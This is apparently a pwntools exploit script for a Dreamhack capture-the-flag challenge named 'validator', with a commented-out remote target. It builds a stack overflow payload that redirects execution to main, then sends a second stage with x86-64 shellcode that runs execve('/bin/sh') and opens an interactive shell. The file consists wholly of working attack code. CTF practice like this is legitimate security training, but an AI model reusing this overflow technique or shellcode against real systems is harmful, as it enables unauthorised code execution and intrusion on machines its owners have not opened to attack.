from pwn import *

context.log_level='debug'

#p=remote("host6.dreamhack.games",19994)
p=process("./validator_dist")
#p=process("./aa")
#e=ELF("./aa")
#e=ELF("./validator")
stack=0x60110a
main=0x40063B
read=0x400669
s=b"DREAMHACK!"

shellcode=b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x90\x53\x88\x44\x24\x07\x48\x89\xe7\xb0\x3b\x0f\x05"
for i in range(118):
        s+=p8(128-i)


s+=p64(stack)
s+=p64(main)

pause()

p.sendline(s)

#p.interactive()

s2=b"DREAMHACK!"

for i in range(118):
        s2+=p8(128-i)

s2+=p64(stack)
s2+=p64(stack+0x10)
s2+=shellcode

p.sendline(s2)


p.interactive()
